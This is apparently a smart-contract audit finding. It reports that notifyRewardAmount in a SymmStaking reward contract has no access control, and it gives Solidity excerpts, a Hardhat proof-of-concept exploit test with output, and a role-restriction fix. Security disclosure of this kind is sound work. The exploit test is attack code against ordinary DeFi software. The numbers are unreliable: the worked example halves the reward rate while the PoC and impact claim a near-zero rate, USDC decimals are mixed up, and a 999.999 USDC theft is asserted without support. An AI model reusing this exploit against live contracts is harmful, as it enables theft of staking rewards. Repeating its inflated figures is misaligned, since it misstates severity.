# Unauthorized Reward Notification




## Summary
The notifyRewardAmount function lack access control thereby allowing any user to notify rewards for whitelisted tokens so the Attackers can exploit this to manipulate reward rates and drain the rewards by front-running legitimate reward notifications.

## Code Snippet 
1. **Unauthorized Access to notifyRewardAmount**:
```solidity
   function notifyRewardAmount(...........) external nonReentrant whenNotPaused {
       // @audit: no role check 
   }
```
2. **Reward Rate Reset Logic**:
```solidity
   function _addRewardsForToken(...............) internal {
       if (block.timestamp < state.periodFinish) {
           uint256 leftover = remaining * state.rate;
           state.rate = (amount + leftover) / state.duration; //@audit: dilute rate
       }
       state.periodFinish = block.timestamp + state.duration; //@audit: Reset period
   }
```

## Vulnerability details
The notifyRewardAmount function is designed to add new rewards to the staking pool. However, it lack the access control meaning that  anyone not just admins can trigger it.

   When notifyRewardAmount is called:
   - it transfer the reward token to the contract.  
```solidity
     IERC20(token).safeTransferFrom(msg.sender, address(this), amount);
```
   - Then update the pendingRewards as the total unclaimed rewards.  
```solidity
     pendingRewards[token] += amount; // so even if the amount = 1 wei
```
   - it then recalculate the reward rate using _addRewardsForToken().  
```solidity
     _addRewardsForToken(token, amount); // so it is now vulnerability 
```

4. let's look at how the reward Rate Manipulation can occur inside the _addRewardsForToken: 
   - **Case 1 (No Active Rewards)**:  
     If the current reward period has ended which is the 
block.timestamp >= periodFinish, the new reward rate is set to:  
```solidity
     rate = amount / duration; // example: 1 wei / 1 week = then become a near-zero rate
```
   - **Case 2 (Active Rewards)**:  
     If rewards are still being distributed as of block.timestamp < periodFinish:  
```solidity
     uint256 remaining = periodFinish - block.timestamp;
     uint256 leftover = remaining * currentRate; // so the existing unclaimed rewards
     rate = (amount + leftover) / duration; // and the diluted leftover + new amount over full duration
```
**looking at this simple example:**  
-  Existing rewards: 1000 USDC is distributed over 1 week (rate = 1000 / 604800 ≈ 0.00165 USDC/sec).  
-  Attacker then notify 1 wei with 3 days remaining.  
-  so the leftover = 3 days * 0.00165 ≈ 432 USDC.  
- Now the new rate: 
(1 wei + 432) / 604800 ≈ 0.00071 USDC/sec and then which is half of the original rate)





## Proof of Concept (PoC):

1. As the admin whitelist USDC as a reward token then call notifyRewardAmount(USDC, 1000e18) to distribute 1,000 USDC over 1 week (DEFAULT_REWARDS_DURATION).

   The Reward Rate Before Attack happen is :
```solidity
   Rate = 1000e18 USDC / 604800 seconds ≈ 1.65e15 USDC per sec
```

2. Elijah as a legitimate user stakes 1,000 SYMM tokens expecting to earn rewards at that above rate.


3. Attacker then front-run calling the notifyRewardAmount(USDC, 1) as the 1 wei of USDC
   - This trigger the _addRewardsForToken which recalculate the reward rate:
```solidity
     if (block.timestamp < state.periodFinish) {
         uint256 remaining = state.periodFinish - block.timestamp;
         uint256 leftover = remaining * state.rate; // leftover = remaining * 1.65e15
         state.rate = (1 + leftover) / 604800; // new rate ≈ 0.00000000165e15 USDC per sec
     }
```
   - Then the reward rate drop to near-zero and the periodFinish reset to 1 week from now.

4. Then the Admin intended notifyRewardAmount which is the (USDC, 1000e18) now distribute rewards at the diluted rate which is set by the attacker.
   

## Test 


```javascript
const { expect } = require("chai");
const { ethers, upgrades } = require("hardhat");
const { time } = require("@nomicfoundation/hardhat-network-helpers");

describe("Unauthorized Reward Notification Exploit", function () {
  let admin, user, attacker;
  let SymmStaking, staking;
  let SYMM, USDC;

  before(async () => {
    [admin, user, attacker] = await ethers.getSigners();

    // the deploy mock token
    const ERC20 = await ethers.getContractFactory("ERC20Mock");
    SYMM = await ERC20.deploy("SYMM", "SYMM", 18);
    USDC = await ERC20.deploy("USDC", "USDC", 6);
    await SYMM.deployed();
    await USDC.deployed();

    // then deploy staking contract
    const SymmStaking = await ethers.getContractFactory("SymmStaking");
    staking = await upgrades.deployProxy(SymmStaking, [admin.address, SYMM.address]);
    await staking.deployed();

    // now setting up the role
    await staking.grantRole(await staking.REWARD_MANAGER_ROLE(), admin.address);
  });

  it("Allows attacker to dilute reward rates via unauthorized notification", async () => {
    // Admin whitelist USDC as reward token
    await staking.connect(admin).configureRewardToken(USDC.address, true);

    // the initial rewards 
    const legitAmount = ethers.utils.parseUnits("1000", 6); // 1000 USDC (1,000,000,000 wei with 6 decimals) 
    await USDC.mint(admin.address, legitAmount);
    await USDC.connect(admin).approve(staking.address, legitAmount);

    // Admin notify the legitimate reward
    await staking.connect(admin).notifyRewardAmount([USDC.address], [legitAmount]);
    
    // the initial reward rate
    const initialRate = (await staking.rewardState(USDC.address)).rate;
    
    // user stake the SYMM tokens
    const stakeAmount = ethers.utils.parseEther("1000"); // 1000 SYMM
    await SYMM.mint(user.address, stakeAmount);
    await SYMM.connect(user).approve(staking.address, stakeAmount);
    await staking.connect(user).deposit(stakeAmount, user.address);

    // and then attacker front run with 1 wei 
    const attackAmount = 1; // 1 wei = 0.000001 USDC
    await USDC.mint(attacker.address, attackAmount);
    await USDC.connect(attacker).approve(staking.address, attackAmount);

    // attacker trigger the unauthorized reward notification
    await staking.connect(attacker).notifyRewardAmount([USDC.address], [attackAmount]);

    // now verify the new reward rate is diluted
    const newState = await staking.rewardState(USDC.address);
    const newRate = newState.rate;
    expect(newRate).to.be.lt(initialRate); // the rate  decrease

    // Advance the time by 1 week to complete reward period
    await time.increase(604800); 

    // then checking the user rewards is near zero because of the attack
    const earned = await staking.earned(user.address, USDC.address);
    expect(earned).to.be.lt(ethers.utils.parseUnits("1", 6)); // it is now less than 1 USDC earned
  });
});
```




## Output:
```bash
  Unauthorized Reward Notification Exploit
    ✓ Allows attacker to dilute reward rates via unauthorized notification 

  1 passing 
```





##  Impact
1. So before the attack,: Elijah supposed to have earnd 1.65e15 USDC/sec * 604800 sec = 1,000 USDC over 1 week.
 but after Attack: Elijah earned ~0.00000000165e15 USDC/sec * 604800 sec ≈ 0.001 USDC over 1 week.
2. Attacker gain to stake SYMM and claims and the rewards before the rate is diluted stealing 999.999 USDC of the original 1,000 USDC.


## Recommendation
Restrict the notifyRewardAmount() to the REWARD_MANAGER_ROLE:  
```solidity
function notifyRewardAmount(address[] calldata tokens, uint256[] calldata amounts) 
    external 
    nonReentrant 
    whenNotPaused 
    onlyRole(REWARD_MANAGER_ROLE) 
{
   // .......
}
```
